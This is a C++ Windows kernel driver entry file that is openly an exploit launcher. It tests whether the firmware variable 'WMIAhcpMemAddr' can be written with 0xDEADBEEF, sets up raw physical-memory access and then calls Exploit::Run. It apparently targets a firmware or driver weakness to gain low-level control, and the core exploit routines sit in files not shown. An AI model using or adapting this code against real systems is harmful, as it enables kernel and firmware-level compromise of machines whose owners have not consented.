#include "globals.hpp"

static NTSTATUS CheckVariableWrite(VOID)
{
    UINT32 data = 0xDEADBEEF;
    return Exploit::SetVariable(L"WMIAhcpMemAddr", &data, sizeof(0xDEADBEEF));
}

EXTERN_C
NTSTATUS
DriverEntry(
    PDRIVER_OBJECT DriverObject,
    PUNICODE_STRING RegistryPath
)
{
    NTSTATUS status;

    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    ExInitializeDriverRuntime(DrvRtPoolNxOptIn);

    PhysicalMemory pm;
    status = pm.Initialize();

    if (NT_ERROR(status))
    {
        DEBUGMSG("Failed to create PhysicalMemory class %08x", status);
        return status;
    }

    status = CheckVariableWrite();

    if (NT_ERROR(status))
    {
        DEBUGMSG("WMIAhcpMemAddr variable is not writable");
        return STATUS_CANCELLED;
    }

    Exploit::Run(&pm);

    status = STATUS_CANCELLED;

    return status;
}